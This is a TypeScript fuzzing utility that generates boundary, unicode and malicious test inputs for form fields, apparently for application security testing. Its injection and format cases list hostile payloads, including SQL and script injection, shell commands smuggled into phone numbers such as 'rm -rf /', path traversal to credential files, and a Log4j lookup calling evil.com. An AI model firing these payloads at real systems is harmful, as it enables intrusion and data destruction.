/**
 * Fuzzer - Generates random test data for fuzzy testing
 * Implements multiple mutation strategies for comprehensive testing
 */

export interface FuzzOptions {
  seed?: number;
  strategy?: FuzzStrategy;
  maxLength?: number;
  minLength?: number;
}

export type FuzzStrategy =
  | 'random' // Pure random generation
  | 'boundary' // Edge cases (empty, min, max)
  | 'mutation' // Mutate valid data
  | 'injection' // SQL/XSS injection patterns
  | 'unicode' // Unicode edge cases
  | 'overflow' // Buffer overflow attempts
  | 'format' // Format string attacks
  | 'mixed'; // Mix of all strategies

export class Fuzzer {
  private seed: number;

  constructor(seed?: number) {
    this.seed = seed || Date.now();
  }

  /**
   * Seeded random number generator (Mulberry32)
   */
  private random(): number {
    let t = (this.seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  }

  /**
   * Random integer between min and max (inclusive)
   */
  randomInt(min: number, max: number): number {
    return Math.floor(this.random() * (max - min + 1)) + min;
  }

  /**
   * Pick random element from array
   */
  randomChoice<T>(array: T[]): T {
    return array[this.randomInt(0, array.length - 1)];
  }

  /**
   * Generate random string
   */
  randomString(length: number, charset?: string): string {
    const chars =
      charset ||
      'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars[this.randomInt(0, chars.length - 1)];
    }
    return result;
  }

  /**
   * Fuzz an email address
   */
  fuzzEmail(strategy: FuzzStrategy = 'mixed'): string {
    switch (strategy) {
      case 'boundary':
        return this.randomChoice([
          '', // Empty
          '@', // Just @
          'a@b', // Minimal
          '@domain.com', // No local
          'local@', // No domain
          `${'a'.repeat(64)}@${'b'.repeat(255)}.com`, // Max length
          `${'a'.repeat(65)}@domain.com`, // Over max local
        ]);

      case 'injection':
        return this.randomChoice([
          "admin'--@domain.com",
          'admin@domain.com<script>',
          '${7*7}@domain.com',
          'admin@domain.com\x00',
          '../../../etc/passwd@domain.com',
          'admin@domain.com%00',
          'admin"@domain.com',
          "admin'OR'1'='1@domain.com",
        ]);

      case 'unicode':
        return this.randomChoice([
          'user@домен.com', // Cyrillic
          'user@δοκιμή.com', // Greek
          '用户@例え.jp', // Chinese/Japanese
          'user@🏠.com', // Emoji
          'ユーザー@example.com', // Katakana
          'مستخدم@مثال.com', // Arabic
        ]);

      case 'mutation': {
        const base = `${this.randomString(8)}@${this.randomString(5)}.com`;
        const mutations = [
          base.replace('@', '@@'), // Double @
          base.replace('.', '..'), // Double dot
          base.toUpperCase(), // All caps
          base.replace(/[a-z]/i, ' '), // Add space
          '.' + base, // Leading dot
          base + '.', // Trailing dot
        ];
        return this.randomChoice(mutations);
      }

      case 'random':
      default:
        if (this.random() > 0.5) {
          // Valid-ish structure
          return `${this.randomString(this.randomInt(1, 20))}@${this.randomString(this.randomInt(1, 10))}.${this.randomString(this.randomInt(2, 4))}`;
        } else {
          // Pure random
          return this.randomString(this.randomInt(0, 100));
        }
    }
  }

  /**
   * Fuzz a phone number
   */
  fuzzPhone(strategy: FuzzStrategy = 'mixed'): string {
    switch (strategy) {
      case 'boundary':
        return this.randomChoice([
          '', // Empty
          '0', // Too short
          '+', // Just plus
          '0'.repeat(20), // Too long
          '+33612345678', // Valid
          '00000000000', // All zeros
          '11111111111', // All same digit
        ]);

      case 'injection':
        return this.randomChoice([
          '+33;cat /etc/passwd',
          '+33`whoami`',
          '+33$(id)',
          '+33|ls',
          '+33 && rm -rf /',
        ]);

      case 'format':
        return this.randomChoice([
          '06 12 34 56 78', // Spaces
          '06-12-34-56-78', // Dashes
          '06.12.34.56.78', // Dots
          '(06) 12 34 56 78', // Parentheses
          '+33 (0) 6 12 34 56 78', // Full format
        ]);

      case 'random':
      default: {
        const length = this.randomInt(0, 20);
        return (
          this.randomChoice(['+', '0', '']) +
          this.randomString(length, '0123456789 -().+')
        );
      }
    }
  }

  /**
   * Fuzz a credit card number
   */
  fuzzCreditCard(strategy: FuzzStrategy = 'mixed'): string {
    switch (strategy) {
      case 'boundary':
        return this.randomChoice([
          '', // Empty
          '0', // Too short
          '4'.repeat(30), // Too long
          '0000000000000000', // All zeros
          '4111111111111111', // Valid Visa
          '5500000000000004', // Valid MC
        ]);

      case 'mutation': {
        // Start with valid card and mutate
        const validCard = '4111111111111111';
        const pos = this.randomInt(0, validCard.length - 1);
        const newDigit = (
          (Number.parseInt(validCard[pos]) + this.randomInt(1, 9)) %
          10
        ).toString();
        return (
          validCard.substring(0, pos) + newDigit + validCard.substring(pos + 1)
        );
      }

      case 'injection':
        return this.randomChoice([
          "4111'1111'1111'1111",
          '4111<script>alert(1)</script>',
          '4111\x00111111111111',
          '4111${7*7}11111111',
        ]);

      case 'random':
      default: {
        const length = this.randomInt(12, 20);
        return this.randomString(length, '0123456789');
      }
    }
  }

  /**
   * Fuzz a password
   */
  fuzzPassword(strategy: FuzzStrategy = 'mixed'): string {
    switch (strategy) {
      case 'boundary':
        return this.randomChoice([
          '', // Empty
          'a', // 1 char
          'aa', // 2 chars
          'aaa', // 3 chars
          'a'.repeat(1000), // Very long
          'Aa1!Aa1!', // Minimum valid
        ]);

      case 'injection':
        return this.randomChoice([
          "password' OR '1'='1",
          'password<script>',
          'password${7*7}',
          'password\x00',
          'password%00',
          '../../../etc/passwd',
        ]);

      case 'unicode':
        return this.randomChoice([
          '密码Пароль🔐', // Mixed unicode
          'パスワード123!', // Japanese
          'كلمة السر', // Arabic
          'סיסמה', // Hebrew
          '🔐🔑🔒💀👻', // Emoji only
        ]);

      case 'format':
        // Common password patterns
        return this.randomChoice([
          'password123',
          'Password123!',
          'P@ssw0rd',
          'admin',
          '123456',
          'qwerty',
          'letmein',
          'MyP@ssw0rd!2024',
        ]);

      case 'random':
      default: {
        const length = this.randomInt(0, 50);
        return this.randomString(
          length,
          'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?',
        );
      }
    }
  }

  /**
   * Fuzz any string input
   */
  fuzzString(
    strategy: FuzzStrategy = 'mixed',
    options?: { maxLength?: number },
  ): string {
    const maxLen = options?.maxLength || 1000;

    switch (strategy) {
      case 'boundary':
        return this.randomChoice([
          '', // Empty
          ' ', // Single space
          '\t', // Tab
          '\n', // Newline
          '\r\n', // CRLF
          'a'.repeat(maxLen), // Max length
          'a'.repeat(maxLen + 1), // Over max
        ]);

      case 'injection':
        return this.randomChoice([
          "'; DROP TABLE users; --",
          '<script>alert("XSS")</script>',
          '{{7*7}}',
          '${7*7}',
          '$(whoami)',
          '`id`',
          '%00',
          '%0A%0D',
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          'file:///etc/passwd',
          'javascript:alert(1)',
        ]);

      case 'unicode':
        return this.randomChoice([
          '\u0000', // Null
          '\uFEFF', // BOM
          '\u202E', // Right-to-left override
          '\u200B', // Zero-width space
          'Ã©', // Mojibake
          '한국어테스트', // Korean
          'العربية', // Arabic
          '🏳️‍🌈', // Complex emoji
          '\u0301'.repeat(1000), // Combining chars
        ]);

      case 'overflow':
        return 'A'.repeat(this.randomChoice([256, 512, 1024, 4096, 65536]));

      case 'format':
        return this.randomChoice([
          '%s%s%s%s%s', // Format string
          '%n%n%n%n%n', // Format string write
          '%x%x%x%x%x', // Hex dump
          '${jndi:ldap://evil.com/a}', // Log4j
          '{{constructor.constructor("return this")()}}', // Prototype pollution
        ]);

      case 'random':
      default:
        return this.randomString(this.randomInt(0, maxLen));
    }
  }

  /**
   * Generate a batch of fuzzed inputs
   */
  generateBatch<T>(
    count: number,
    generator: (strategy: FuzzStrategy) => T,
    strategies?: FuzzStrategy[],
  ): T[] {
    const allStrategies: FuzzStrategy[] = strategies || [
      'random',
      'boundary',
      'mutation',
      'injection',
      'unicode',
      'overflow',
      'format',
    ];

    const results: T[] = [];
    for (let i = 0; i < count; i++) {
      const strategy = this.randomChoice(allStrategies);
      results.push(generator(strategy));
    }
    return results;
  }
}

/**
 * Predefined fuzzer instances
 */
export const fuzzer = new Fuzzer();

/**
 * Create a seeded fuzzer for reproducible tests
 */
export function createSeededFuzzer(seed: number): Fuzzer {
  return new Fuzzer(seed);
}
